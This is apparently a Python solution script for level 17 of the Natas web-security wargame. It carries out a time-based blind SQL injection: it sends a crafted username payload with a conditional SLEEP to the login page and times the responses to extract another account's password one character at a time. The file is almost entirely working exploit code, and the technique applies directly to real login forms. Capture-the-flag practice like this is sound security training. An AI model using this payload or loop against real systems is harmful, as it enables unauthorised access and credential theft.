import string
import time

from natas.lib import natas_session

session, url = natas_session(17)


def long_response_time(password_prefix: str) -> bool:
    start_time = time.perf_counter()
    query = f"""(SELECT COUNT(*) from users WHERE username="natas18" AND BINARY password LIKE '{password_prefix}%')"""
    payload = {
        "username": f"""natas18" AND IF({query} > 0, SLEEP(1), 'anything') -- """,
        "submit": "Login",
    }
    session.post(url + "/index.php", data=payload)
    end_time = time.perf_counter()
    # print(f"Prefix: {password_prefix} took {et - st:.2f} seconds")
    return (end_time - start_time) > 1


POSSIBLE_CHARS = string.ascii_letters + string.digits

password = ""
while True:
    found_next_char = False

    for ch in POSSIBLE_CHARS:
        if long_response_time(password + ch):
            password += ch
            found_next_char = True
            break

    if not found_next_char:
        break

print(password)
